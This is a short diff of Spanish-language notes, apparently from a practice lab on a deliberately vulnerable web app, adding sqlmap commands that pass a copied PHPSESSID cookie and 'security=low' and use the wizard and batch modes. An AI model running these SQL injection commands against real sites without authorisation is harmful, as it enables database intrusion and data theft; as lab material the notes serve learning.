@@ -1,3 +1,7 @@
 ++ Terminal
 --- sqlmap -hh
---- 
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --wizard 
+--- Enter (en todas las opciones que se pidan para aceptar los parámetros por default)
+--- sqlmap <url_copiada> --cookie='PHPSESSID=<valor_copiado>; security=low' --wizard --batch (Permite seleccionar los valores por default de forma automática)
+
+
